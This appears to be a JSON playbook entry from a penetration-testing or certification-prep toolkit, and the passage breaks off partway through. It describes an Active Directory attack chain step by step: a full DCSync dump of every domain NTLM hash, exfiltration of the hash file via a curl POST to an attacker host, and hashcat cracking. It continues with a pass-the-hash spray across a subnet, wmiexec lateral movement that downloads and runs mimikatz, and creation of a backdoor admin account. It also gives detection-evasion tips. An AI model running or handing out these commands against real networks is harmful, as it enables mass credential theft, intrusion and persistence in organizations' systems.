{
  "id": "ad-dcsync-mass-extraction",
  "name": "DCSync Mass Credential Harvesting for Lateral Movement",
  "description": "Advanced attack chain for comprehensive domain credential extraction and mass lateral movement.\n\nExtracts ALL domain user hashes via DCSync full dump, performs batch password cracking with rule-based attacks, sprays Pass-the-Hash across subnet to discover local admin access, and establishes lateral movement to high-value targets. IDEAL for security assessment scenarios requiring domain-wide compromise.\n\nDETECTION RISK: High. Full DCSync generates significant replication traffic (EventID 4662), PTH spray creates multiple failed logon events (EventID 4625) if unsuccessful, lateral movement triggers process creation events (EventID 4688). TRADEOFF: Speed and coverage vs stealth.",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - pentest Track",
    "created": "2025-11-23",
    "updated": "2025-11-23",
    "tags": [
      "ACTIVE_DIRECTORY",
      "DCSYNC",
      "MASS_EXTRACTION",
      "CREDENTIAL_ACCESS",
      "LATERAL_MOVEMENT",
      "PASSWORD_CRACKING",
      "PASS_THE_HASH",
      "POST_EXPLOITATION"
    ],
    "category": "credential-access",
    "platform": "active-directory",
    "references": [
      "https://attack.mitre.org/techniques/T1003/006/",
      "https://attack.mitre.org/techniques/T1021/002/",
      "https://attack.mitre.org/techniques/T1550/002/",
      "https://hashcat.net/wiki/doku.php?id=rule_based_attack",
      "https://github.com/fortra/impacket"
    ]
  },
  "difficulty": "advanced",
  "time_estimate": "120 minutes",
  "prerequisites": [
    "Domain Admin credentials OR Domain User with replication rights (DCSync permissions)",
    "Network access to Domain Controller (SMB 445/tcp, RPC 135/tcp)",
    "Kali Linux with Hashcat installed (GPU recommended for faster cracking)",
    "Network access to target subnet for PTH spray (SMB 445/tcp)",
    "Wordlist for password cracking (rockyou.txt minimum, larger lists for better coverage)"
  ],
  "notes": "certification MASS EXTRACTION STRATEGY: This chain prioritizes SPEED and COVERAGE over stealth. Goal: Compromise maximum systems in minimum time. EXAM SCENARIO: Often needed when specific privilege escalation path unclear - cast wide net to find alternate routes. EXPECTED RESULTS: Enterprise domains (500-5000 users) \u2192 20-40% password crack rate with rockyou.txt + rules, 5-15% local admin access across subnet. Small domains (50-500 users) \u2192 40-70% crack rate (weaker passwords), 15-30% local admin. DETECTION TRADE-OFF: Full DCSync + PTH spray = HIGHLY DETECTABLE in production (blue team will notice). Acceptable for certification exam (no active defense). AVOID in real penetration tests unless specifically authorized for aggressive tactics. TIME BREAKDOWN: DCSync full dump (5-20 min depending on domain size), Hash transfer (1-2 min), Hashcat cracking (10-120 min depending on wordlist/rules), PTH spray (5-15 min for /24 subnet), Lateral movement (5-10 min per target). HASH MANAGEMENT: Full domain dump generates 500-5000+ NTLM hashes. CRITICAL: Organize by username, filter for valuable accounts (admin groups, service accounts), prioritize cracking efforts. ALTERNATIVE APPROACHES: If DCSync unavailable, try (1) NTDS.dit extraction via VSS shadow copy, (2) Kerberoasting for service accounts, (3) AS-REP roasting for pre-auth disabled users.",
  "steps": [
    {
      "id": "verify-dcsync-access",
      "name": "Verify DCSync Permissions and Network Connectivity",
      "objective": "Confirm account has replication rights and DC is accessible for full credential dump",
      "description": "PREREQUISITES: Full domain DCSync requires same permissions as single-user DCSync BUT generates significantly more traffic and takes longer.\n\nREQUIRED PERMISSIONS:\n(1) DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n(2) DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n\nVERIFICATION TEST:\nimpacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'\n\nSUCCESS: krbtgt hash retrieved \u2192 Rights confirmed, proceed to full dump.\nFAILURE: ERROR_ACCESS_DENIED \u2192 Insufficient rights, cannot proceed.\n\nNETWORK CONNECTIVITY:\nsudo nmap -p 445,135,139,88 -Pn -v <DC_IP>\n\nREQUIRED PORTS:\n- 445/tcp (SMB) - Primary replication channel\n- 135/tcp (RPC) - DRSUAPI endpoint\n- 139/tcp (NetBIOS) - Legacy support\n- 88/tcp (Kerberos) - Authentication\n\nBANDWIDTH CONSIDERATION: Full DCSync transfers ENTIRE NTDS.DIT database over network.\nSmall domain (500 users) \u2248 50-100 MB transfer.\nLarge domain (5000 users) \u2248 500 MB - 1 GB transfer.\nEstimate: ~10 KB per user account (includes password history, metadata).\n\nOPSEC IMPACT ASSESSMENT:\n- Full DCSync = MAXIMUM detection risk (sustained high-volume replication from non-DC)\n- Blue team indicators: Large data transfer to non-DC IP, EventID 4662 (hundreds/thousands of events), network anomaly detection (unexpected replication traffic)\n- TIMING: If stealth required, execute during maintenance windows or after-hours (less monitoring)\n- ALTERNATIVE: If detection critical concern, use targeted DCSync (extract only high-value users) instead of full dump\n\nTIME SYNCHRONIZATION:\nsudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>\nVerify: date (confirm <5 min difference from DC time)\n\nCRITICAL: Time sync prevents KRB_AP_ERR_SKEW errors during long DCSync operation.\n\nTIME ESTIMATE: 3-5 minutes.",
      "command_ref": "ad-dcsync-check-permissions",
      "evidence": [
        "Test DCSync succeeds (krbtgt hash retrieved)",
        "DC accessible on all required ports (445, 135, 139, 88)",
        "Time synchronized within 5 minutes of DC",
        "Network bandwidth sufficient for large transfer",
        "No access denied or permission errors"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Account has replication rights confirmed",
        "All required ports open and accessible",
        "Time synchronization verified",
        "No Kerberos or authentication errors"
      ],
      "failure_conditions": [
        "ERROR_ACCESS_DENIED (insufficient replication rights)",
        "rpc_s_access_denied (account lacks DCSync permissions)",
        "Connection timeout (firewall blocking SMB/RPC ports)",
        "KRB_AP_ERR_SKEW (time sync issue - fix before proceeding)",
        "Network instability (high latency or packet loss - affects large transfer)"
      ],
      "next_steps": [
        "execute-full-dcsync"
      ]
    },
    {
      "id": "execute-full-dcsync",
      "name": "Extract All Domain Credentials via Full DCSync",
      "objective": "Perform complete DCSync replication to extract NTLM hashes for all domain user accounts",
      "description": "FULL DCSYNC COMMAND (Impacket - RECOMMENDED):\nimpacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile domain_hashes\n\nFLAGS EXPLAINED:\n-just-dc-ntlm: Extract ONLY NTLM hashes (skip LM hashes, Kerberos keys - faster extraction, smaller output)\n-outputfile domain_hashes: Save output to files with prefix 'domain_hashes'\n  Creates: domain_hashes.ntds (NTLM hashes), domain_hashes.ntds.cleartext (if any cleartext passwords), domain_hashes.ntds.kerberos (Kerberos keys if not using -just-dc-ntlm)\n\nALTERNATIVE (Full extraction including Kerberos):\nimpacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile full_dump\nUse if you need Kerberos keys (AES128, AES256) for advanced attacks. SLOWER and LARGER output.\n\nOUTPUT FORMAT (domain_hashes.ntds):\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\ndave:1104:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::\njohn:1105:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\n<...hundreds or thousands more users...>\n\nFORMAT BREAKDOWN:\nusername:RID:LM_hash:NTLM_hash:::\n         ^^^              ^^^^^^^^^ THIS IS WHAT WE NEED (32 hex characters)\n\nEXTRACTION MONITORING:\nProgress indicator: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n                    [*] Using the DRSUAPI method to get NTDS.DIT secrets\n                    <real-time hash output scrolling>\n\nTIME ESTIMATES:\n- Small domain (50-500 users): 2-5 minutes\n- Medium domain (500-2000 users): 5-15 minutes  \n- Large domain (2000-10000 users): 15-60 minutes\n\nPROGRESS CHECK: Count hashes extracted so far:\nwc -l domain_hashes.ntds\nExample output: 2847 domain_hashes.ntds (2847 user accounts dumped)\n\nOPSEC DETECTION:\n- EventID 4662 generated for EVERY user extracted (hundreds to thousands of events)\n- SIEM alerts: Sustained replication activity from non-DC IP\n- Network monitoring: Large data transfer from DC to unknown system\n- DC CPU spike during extraction (noticeable on resource-constrained DCs)\n\nFAILURE RECOVERY:\nIf DCSync interrupted (network drop, timeout):\n- Partial output saved to domain_hashes.ntds (keep existing file)\n- Resume not supported - must restart full extraction\n- Consider: Split extraction by OU if full dump repeatedly fails\n\nFILE SIZE EXPECTATIONS:\n500 users \u2248 50-100 KB .ntds file\n2000 users \u2248 200-400 KB .ntds file\n10000 users \u2248 1-2 MB .ntds file\n\nCRITICAL: Verify file integrity after extraction:\ncat domain_hashes.ntds | head -5 (verify format correct)\nwc -l domain_hashes.ntds (verify count reasonable for domain size)\n\nTIME ESTIMATE: 5-20 minutes (domain size dependent).",
      "command_ref": "ad-dcsync-impacket-secretsdump-user",
      "evidence": [
        "domain_hashes.ntds file created successfully",
        "File contains NTLM hashes in correct format (username:RID:LM:NTLM:::)",
        "Hash count matches expected domain user count",
        "No extraction errors or incomplete transfers",
        "File size consistent with domain size"
      ],
      "dependencies": [
        "verify-dcsync-access"
      ],
      "repeatable": true,
      "success_criteria": [
        "Full DCSync completes without errors",
        "All domain user hashes extracted to file",
        "Output file format valid (Hashcat/John compatible)",
        "Hash count reasonable for domain size"
      ],
      "failure_conditions": [
        "ERROR_DS_DRA_ACCESS_DENIED (replication rights revoked mid-extraction)",
        "Connection timeout (network instability during long transfer)",
        "Disk full (insufficient space for output file)",
        "KRB_AP_ERR_SKEW (time sync drift during long extraction)",
        "Partial extraction (file incomplete - retry full dump)"
      ],
      "next_steps": [
        "transfer-hash-database"
      ]
    },
    {
      "id": "transfer-hash-database",
      "name": "Transfer Hash Database to Kali for Cracking",
      "objective": "Move NTDS hash dump from extraction location to Kali system with Hashcat",
      "description": "SKIP IF: DCSync executed directly on Kali Linux (impacket-secretsdump).\nHashes already local - proceed to step 4 (batch-crack-hashes).\n\nREQUIRED IF: DCSync executed on Windows system OR remote Linux box without Hashcat.\n\nFILE TO TRANSFER: domain_hashes.ntds (primary file with NTLM hashes)\nOptional: domain_hashes.ntds.cleartext (if any cleartext passwords found)\n\nTRANSFER METHOD 1: IMPACKET SMB SERVER (RECOMMENDED for large files)\n\nKali setup:\nsudo impacket-smbserver -smb2support -username transfer -password 'TransferPass123!' hashxfer /home/kali/loot\n\nFrom Windows:\nnet use \\\\\\\\<KALI_IP>\\\\hashxfer /user:transfer TransferPass123!\ncopy domain_hashes.ntds \\\\\\\\<KALI_IP>\\\\hashxfer\\\nnet use \\\\\\\\<KALI_IP>\\\\hashxfer /delete\n\nFrom Linux:\nsmbclient //<KALI_IP>/hashxfer -U transfer%TransferPass123!\nsmb: \\\\> put domain_hashes.ntds\nsmb: \\\\> exit\n\nTRANSFER METHOD 2: SCP (Linux to Linux)\nscp domain_hashes.ntds kali@<KALI_IP>:/home/kali/loot/\n\nTRANSFER METHOD 3: BASE64 ENCODE (No direct connectivity)\n\nSource system:\nbase64 domain_hashes.ntds > hashes.b64\ncat hashes.b64 (copy output)\n\nKali:\ncat > hashes.b64 << 'EOF'\n<paste Base64 content>\nEOF\nbase64 -d hashes.b64 > domain_hashes.ntds\n\nTRANSFER METHOD 4: HTTP POST (One-way exfiltration)\n\nKali listener:\npython3 -m http.server 8000 --bind 0.0.0.0\n\nSource system:\ncurl -X POST -F \"file=@domain_hashes.ntds\" http://<KALI_IP>:8000/upload\nOR (Windows PowerShell):\nInvoke-WebRequest -Uri http://<KALI_IP>:8000/upload -Method POST -InFile domain_hashes.ntds\n\nNote: Requires simple HTTP upload handler - use SMB method if Python server insufficient.\n\nFILE VALIDATION (CRITICAL):\n\nOn Kali:\nls -lh domain_hashes.ntds (verify file size matches source)\nwc -l domain_hashes.ntds (verify hash count matches source)\nhead -5 domain_hashes.ntds (verify format: username:RID:LM:NTLM:::)\n\nExpected format:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n\nIf format broken or corrupted:\n- Re-transfer using different method\n- Check for encoding issues (Windows line endings vs Unix)\n- Verify no truncation during copy/paste (Base64 method)\n\nHASH EXTRACTION (Prepare for Hashcat):\n\nHashcat requires ONLY NTLM hashes (not full secretsdump format):\ncat domain_hashes.ntds | cut -d ':' -f 4 > ntlm_hashes.txt\n\nVerify:\nhead -5 ntlm_hashes.txt\nExpected output:\na9b30e5b0dc865eadcea9411e4ade72d\n31d6cfe0d16ae931b73c59d7e0c089c0\n08d7a47a6f9f66b97b1bae4178747494\n<...pure NTLM hashes, one per line...>\n\nFILE ORGANIZATION:\nmkdir -p /home/kali/loot/dcsync_$(date +%Y%m%d)\ncd /home/kali/loot/dcsync_$(date +%Y%m%d)\nmv ~/domain_hashes.ntds .\nmv ~/ntlm_hashes.txt .\n\nTIME ESTIMATE: 1-3 minutes (depends on file size and transfer method).",
      "command_ref": "impacket-smbserver",
      "evidence": [
        "domain_hashes.ntds file present on Kali",
        "File integrity verified (hash count and format correct)",
        "ntlm_hashes.txt extracted (pure NTLM hashes for Hashcat)",
        "Files organized in dedicated directory",
        "No corruption during transfer"
      ],
      "dependencies": [
        "execute-full-dcsync"
      ],
      "repeatable": true,
      "success_criteria": [
        "Hash file successfully transferred to Kali",
        "File size matches source (no truncation)",
        "Hash format valid (secretsdump format verified)",
        "NTLM hashes extracted to separate file for Hashcat"
      ],
      "failure_conditions": [
        "Transfer failed (network connectivity issue)",
        "File corrupted (format invalid after transfer)",
        "Incomplete transfer (file size mismatch)",
        "Permission denied (cannot write to target directory)",
        "Base64 decode error (copy/paste truncation)"
      ],
      "next_steps": [
        "batch-crack-hashes"
      ]
    },
    {
      "id": "batch-crack-hashes",
      "name": "Batch Crack NTLM Hashes with Hashcat Rule-Based Attack",
      "objective": "Recover plaintext passwords from mass-extracted NTLM hashes using optimized wordlist and rule combinations",
      "description": "HASHCAT BATCH CRACKING STRATEGY: Prioritize speed and coverage. Use progressive attack complexity (fast attacks first, slower attacks if time permits).\n\nATTACK PHASE 1: STRAIGHT DICTIONARY (FASTEST - try first)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force --username\n\nFlags:\n-m 1000: NTLM hash mode\n-a 0: Straight dictionary attack (no mutations)\n--force: Suppress OpenCL warnings (required on Kali VM)\n--username: Optional - preserves username:hash format if input has usernames\n\nTime: 1-5 minutes on GPU, 10-30 minutes on CPU\nExpected: 15-25% crack rate (common weak passwords: password, Password1, Welcome1, company name)\n\nATTACK PHASE 2: RULE-BASED ATTACK (RECOMMENDED - best balance)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\nRule mutations applied by best64.rule:\n- Capitalize first letter: password \u2192 Password\n- All uppercase: password \u2192 PASSWORD\n- Append numbers: password \u2192 password1, password123, password2023\n- Leet speak: password \u2192 p@ssw0rd, p@55w0rd\n- Reverse: password \u2192 drowssap\n- Common substitutions: password \u2192 passw0rd, Pa$$word\n\nTime: 10-30 minutes on GPU, 1-2 hours on CPU\nExpected: 30-50% crack rate (corporate password patterns: Password1!, CompanyName2023, Welcome123)\n\nATTACK PHASE 3: ADVANCED RULES (If time permits)\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force\n\nTime: 30-90 minutes on GPU, 3-6 hours on CPU\nExpected: Additional 5-15% crack rate (complex mutations)\n\nATTACK PHASE 4: HYBRID ATTACK (Append numbers to wordlist)\nhashcat -m 1000 -a 6 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d --force\n\nAppends all 4-digit combinations (0000-9999) to each wordlist entry.\nExample: password \u2192 password0000, password0001, ..., password9999\n\nTime: Hours to days (only use if extended time available)\n\nMONITORING PROGRESS:\nPress 's' key during cracking for status:\n[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit >> s\n\nStatus output:\nSpeed.........: 500.0 MH/s (GPU) OR 50.0 MH/s (CPU)\nRecovered.....: 847/2450 (34.57%) Digests\nProgress......: 14344384/14344384 (100.00%)\nRemaining.....: 0 seconds\n\nCracked password location:\n~/.hashcat/hashcat.potfile (automatically saved)\n\nVIEW CRACKED PASSWORDS:\nhashcat -m 1000 ntlm_hashes.txt --show --username\n\nOutput format:\na9b30e5b0dc865eadcea9411e4ade72d:Password123!\n08d7a47a6f9f66b97b1bae4178747494:Welcome2023\n<...hash:password pairs...>\n\nEXTRACT USERNAMES AND PASSWORDS (For PTH spray):\n\nMatch cracked hashes back to usernames from domain_hashes.ntds:\ngrep -f <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1) domain_hashes.ntds > cracked_users.txt\n\nFormat output as username:password:\nwhile read line; do\n  user=$(echo $line | cut -d ':' -f 1)\n  hash=$(echo $line | cut -d ':' -f 4)\n  pass=$(grep \"^$hash:\" ~/.hashcat/hashcat.potfile | cut -d ':' -f 2-)\n  echo \"$user:$pass\"\ndone < cracked_users.txt > credentials.txt\n\nResult (credentials.txt):\nAdministrator:Password123!\ndave:Welcome2023\njohn:CompanyName1!\n<...username:password pairs ready for validation...>\n\nCRACKING OPTIMIZATION:\n- GPU cracking MUCH faster (10-50x speedup) - use physical Kali install if available\n- VM cracking acceptable for security work (time limits relaxed, smaller domains)\n- Prioritize high-value accounts: Search for admin, svc, sql, web, backup usernames\n- Stop after 50%+ crack rate - diminishing returns (remaining passwords likely strong)\n\nFAILURE SCENARIOS:\n- No cracks after 30 min straight dictionary \u2192 Passwords not in rockyou.txt (try larger wordlist: /usr/share/wordlists/kaonashi.txt, /usr/share/seclists/Passwords/)\n- GPU errors \u2192 Use --force flag, verify GPU drivers (may need to use CPU mode)\n- Out of memory \u2192 Split ntlm_hashes.txt into smaller batches (1000 hashes per file)\n\nTIME ESTIMATE: 15-60 minutes (Phase 1-2 attacks, sufficient for security assessment).",
      "command_ref": "windows-hashcat-crack-ntlm-file",
      "evidence": [
        "Hashcat executes without errors",
        "Cracked passwords saved to hashcat.potfile",
        "credentials.txt created with username:password pairs",
        "Crack rate >20% achieved (minimum viable for lateral movement)",
        "High-value admin accounts cracked (prioritized targeting)"
      ],
      "dependencies": [
        "transfer-hash-database"
      ],
      "repeatable": true,
      "success_criteria": [
        "Hashcat completes at least Phase 1 and Phase 2 attacks",
        "Minimum 20% crack rate achieved (sufficient for lateral movement)",
        "Cracked credentials extracted and formatted for next steps",
        "At least one Domain Admin or high-privilege account cracked (ideal scenario)"
      ],
      "failure_conditions": [
        "Zero cracks after all attacks (passwords not in wordlists - need custom wordlist or longer attack)",
        "GPU/CPU errors prevent cracking (hardware/driver issues)",
        "Out of memory errors (need to batch process hashes)",
        "Hashcat mode 1000 not supported (wrong Hashcat version)"
      ],
      "next_steps": [
        "spray-pass-the-hash"
      ]
    },
    {
      "id": "spray-pass-the-hash",
      "name": "Spray Pass-the-Hash Across Subnet to Find Local Admin Access",
      "objective": "Test all cracked NTLM hashes against target subnet to identify systems with local administrator privileges",
      "description": "PASS-THE-HASH SPRAY STRATEGY: Test NTLM hashes (both cracked and uncracked) against all domain-joined systems to discover where compromised users have local admin rights.\n\nIMPORTANT: Can use NTLM hashes DIRECTLY (don't need plaintext passwords for PTH). However, cracked passwords help with RDP (step 8) and other services.\n\nCRACKMAPEXEC PTH SPRAY (Multiple hashes, multiple targets):\n\nMETHOD 1: Hash-based spray (no passwords needed)\nExtract usernames and hashes:\ncat domain_hashes.ntds | grep -f <(cat credentials.txt | cut -d ':' -f 1) > targets.txt\nFormat: username:RID:LM:NTLM:::\n\nSpray:\nfor line in $(cat targets.txt); do\n  user=$(echo $line | cut -d ':' -f 1)\n  hash=$(echo $line | cut -d ':' -f 4)\n  crackmapexec smb 192.168.50.0/24 -u \"$user\" -H \"$hash\" -d corp.com --continue-on-success | tee -a spray_results.txt\ndone\n\nMETHOD 2: Direct command (single hash test - use for high-value accounts first)\ncrackmapexec smb 192.168.50.0/24 -u Administrator -H 'a9b30e5b0dc865eadcea9411e4ade72d' -d corp.com\n\nFlags:\n-u: Username\n-H: NTLM hash (uppercase -H for hash, lowercase -h for host)\n-d: Domain name\n--continue-on-success: Test against ALL hosts (don't stop after first success)\n\nOUTPUT ANALYSIS:\n\n[+] 192.168.50.75   445   WS01   [+] corp.com\\\\dave:a9b30e5b (Pwn3d!)\n                                                              ^^^^^^^^ LOCAL ADMIN ACCESS\n\n[+] 192.168.50.80   445   WS02   [+] corp.com\\\\dave:a9b30e5b\n                                                              (no Pwn3d!) = Valid creds, NOT admin\n\n[-] 192.168.50.90   445   SRV01  [-] corp.com\\\\dave:a9b30e5b STATUS_LOGON_FAILURE\n                                                              Invalid creds or account locked\n\nKEY INDICATOR: (Pwn3d!) = User has local admin rights (can access ADMIN$ share).\n\nDOCUMENT COMPROMISED SYSTEMS:\ngrep \"Pwn3d\" spray_results.txt > pwned_systems.txt\n\nExample pwned_systems.txt:\n192.168.50.75 - dave (Pwn3d!)\n192.168.50.82 - john (Pwn3d!)\n192.168.50.95 - Administrator (Pwn3d!)\n\nPRIORITIZE TARGETS:\n(1) Domain Controllers (if any Pwn3d - immediate Domain Admin equivalent)\n(2) Server systems (SQL, Exchange, file servers - high-value data)\n(3) Admin workstations (likely additional credentials in LSASS memory)\n(4) Standard workstations (lower priority unless specific objective)\n\nSPRAY OPTIMIZATION:\n\n- Target /24 subnet (254 IPs): ~3-5 minutes per user hash\n- Multiple /24 subnets: Parallelize with GNU parallel OR crackmapexec threading\n- Large networks (>1000 hosts): Use crackmapexec database mode for tracking\n\nOPSEC CONSIDERATIONS:\n\n- PTH spray generates failed logon events (EventID 4625) for each unsuccessful attempt\n- Successful PTH generates EventID 4624 (Logon Type 3 - Network)\n- SIEM detection: Multiple failed logons from single source IP\n- Account lockout: PTH failures count toward lockout threshold (typically 5-10 attempts)\n- RATE LIMITING: Use --delay <SECONDS> to slow spray if lockout concern\n\nExample with delay:\ncrackmapexec smb 192.168.50.0/24 -u dave -H 'hash' -d corp.com --delay 3\n(3 second delay between each target - reduces detection and lockout risk)\n\nFAILURE SCENARIOS:\n\n- No (Pwn3d!) results: Compromised users are standard users (no local admin anywhere)\n  \u2192 Try: (1) Crack more hashes (target admin/svc accounts), (2) Privilege escalation on standard access systems, (3) Kerberoasting for service accounts\n\n- All STATUS_LOGON_FAILURE: Wrong domain, time sync issues, account lockouts\n  \u2192 Verify: Domain name correct (-d flag), time synced (ntpdate), check individual account status\n\n- Connection timeout: SMB port 445 filtered by firewall\n  \u2192 Alternative: Try WinRM (port 5985) with crackmapexec winrm instead\n\nTIME ESTIMATE: 5-15 minutes for /24 subnet with 10-20 users.",
      "command_ref": "ad-pass-the-hash-crackmapexec",
      "evidence": [
        "crackmapexec spray completed for target subnet",
        "pwned_systems.txt created with (Pwn3d!) systems documented",
        "At least one system with local admin access identified (ideal)",
        "spray_results.txt contains full output for analysis",
        "High-value targets prioritized (DCs, servers, admin workstations)"
      ],
      "dependencies": [
        "batch-crack-hashes"
      ],
      "repeatable": true,
      "success_criteria": [
        "PTH spray completes across target subnet",
        "Systems with local admin access identified ((Pwn3d!) indicator)",
        "Results documented and prioritized",
        "No account lockouts triggered (OPSEC maintained)"
      ],
      "failure_conditions": [
        "Zero (Pwn3d!) results (no local admin access found - need different users or privilege escalation)",
        "Account lockouts (too many failed attempts - violated lockout policy)",
        "SMB port 445 blocked (firewall preventing PTH - try alternative ports/protocols)",
        "All STATUS_LOGON_FAILURE (wrong domain or account issues)"
      ],
      "next_steps": [
        "lateral-movement-wmiexec"
      ]
    },
    {
      "id": "lateral-movement-wmiexec",
      "name": "Lateral Movement via WMI with Pass-the-Hash",
      "objective": "Establish stealthy shell access on compromised systems using WMI-based Pass-the-Hash",
      "description": "WMIEXEC ADVANTAGES OVER PSEXEC:\n- NO service creation (PSExec creates PSEXESVC service - loud and AV-detectable)\n- NO file writes to ADMIN$ share (stealthier)\n- Uses DCOM for semi-interactive shell (standard Windows management protocol)\n- RECOMMENDED for domain controllers and high-security targets\n\nIMPACKET WMIEXEC COMMAND:\nimpacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>\n\nExample:\nimpacket-wmiexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d corp.com/dave@192.168.50.75\n\nFormat explanation:\n-hashes :NTLM (colon before hash, no LM hash needed)\n<DOMAIN>/<USERNAME>@<TARGET> (domain/user@targetIP or FQDN)\n\nSUCCESSFUL CONNECTION:\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\\\>\n\nSHELL COMMANDS:\nwhoami \u2192 Returns: corp\\\\dave (runs as authenticated user, NOT SYSTEM like PSExec)\nhostname \u2192 Returns: WS01\nipconfig \u2192 Shows network configuration\nnet user dave /domain \u2192 Verify domain account details\n\nHIGH-VALUE ACTIONS:\n\n(1) CREDENTIAL HARVESTING:\nRun Mimikatz via WMI:\nC:\\\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\\\Windows\\\\Temp\\\\m.exe\nC:\\\\> C:\\\\Windows\\\\Temp\\\\m.exe privilege::debug sekurlsa::logonpasswords exit\n\nExpected: Plaintext passwords, NTLM hashes, Kerberos tickets from LSASS memory\n\n(2) PERSISTENT ACCESS:\nCreate local admin account:\nC:\\\\> net user hacker Passw0rd123! /add\nC:\\\\> net localgroup Administrators hacker /add\n\n(3) FILE EXFILTRATION:\nAccess C$ share from Kali:\nsmbclient //192.168.50.75/C$ -U 'corp.com/dave%:a9b30e5b0dc865eadcea9411e4ade72d' --pw-nt-hash\nsmb: \\\\> cd Users\\\\Administrator\\\\Desktop\nsmb: \\\\> get proof.txt\n\n(4) PIVOTING:\nUpload Chisel, ssf, or ligolo-ng for pivoting to internal networks\n\nMULTIPLE TARGET WORKFLOW:\n\nFrom pwned_systems.txt (step 6):\n192.168.50.75 - dave (Pwn3d!)\n192.168.50.82 - john (Pwn3d!)\n192.168.50.95 - Administrator (Pwn3d!)\n\nIterate:\nfor target in 192.168.50.75 192.168.50.82 192.168.50.95; do\n  echo \"[*] Accessing $target\"\n  # Execute non-interactive commands\n  impacket-wmiexec -hashes :hash corp.com/user@$target \"whoami\" >> recon_$target.txt\n  impacket-wmiexec -hashes :hash corp.com/user@$target \"ipconfig\" >> recon_$target.txt\n  impacket-wmiexec -hashes :hash corp.com/user@$target \"net user\" >> recon_$target.txt\ndone\n\nOPSEC NOTES:\n\n- WMI executes commands via DCOM (EventID 4688 - Process Creation)\n- Less suspicious than PSExec service (but still logged)\n- BLUE TEAM DETECTION: Unusual processes spawned by wmiprvse.exe (WMI Provider Host)\n- STEALTH: Use during business hours, execute common admin tasks (mimics legitimate behavior)\n\nLIMITATIONS:\n\n- Semi-interactive shell (not fully interactive like SSH)\n- Some interactive programs won't work (e.g., can't run GUI apps)\n- Output buffering (may not see real-time command output)\n- Requires SMB (port 445) and RPC (port 135) access\n\nALTERNATIVES IF WMIEXEC FAILS:\n\n(1) PSExec (louder but more reliable):\nimpacket-psexec -hashes :hash corp.com/user@target\n\n(2) Atexec (scheduled task execution):\nimpacket-atexec -hashes :hash corp.com/user@target \"command\"\n\n(3) SMBExec (service-less execution via SMB):\nimpacket-smbexec -hashes :hash corp.com/user@target\n\nFAILURE SCENARIOS:\n\n- Access denied: User not local admin (recheck spray results - possible false positive)\n- DCOM errors: DCOM disabled or firewalled (try PSExec instead)\n- Connection timeout: RPC/SMB ports blocked\n\nTIME ESTIMATE: 2-5 minutes per target (interactive access and initial recon).",
      "command_ref": "ad-pass-the-hash-impacket-wmiexec",
      "evidence": [
        "WMI shell established on target systems",
        "whoami and hostname commands confirm access",
        "Initial reconnaissance commands executed successfully",
        "Credentials harvested from LSASS (if Mimikatz successful)",
        "Access documented for each compromised system"
      ],
      "dependencies": [
        "spray-pass-the-hash"
      ],
      "repeatable": true,
      "success_criteria": [
        "Shell access obtained on at least one high-value target",
        "Commands execute successfully via WMI",
        "Initial reconnaissance data collected",
        "No connection or permission errors"
      ],
      "failure_conditions": [
        "Access denied despite (Pwn3d!) indicator (possible policy restriction)",
        "DCOM errors (DCOM disabled or blocked by host firewall)",
        "Connection timeout (RPC/SMB ports filtered)",
        "Shell hangs or becomes unresponsive (network instability)"
      ],
      "next_steps": [
        "rdp-high-value-targets"
      ]
    },
    {
      "id": "rdp-high-value-targets",
      "name": "RDP Access to High-Value Systems with Cracked Credentials",
      "objective": "Establish GUI access to prioritized targets using cracked plaintext passwords for interactive operations",
